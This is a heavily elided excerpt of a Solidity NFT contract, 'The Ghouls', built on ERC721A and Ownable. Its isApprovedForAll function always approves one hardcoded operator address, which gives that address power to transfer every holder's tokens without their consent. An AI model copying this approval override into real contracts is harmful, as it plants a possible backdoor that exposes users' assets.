  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x762D663b40431916C286fAbfa0D7c2F176F2b960){return true;}
...
contract The_Ghouls is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("The Ghouls", "THEGHOULS", maxBatchSize_, collectionSize_) {
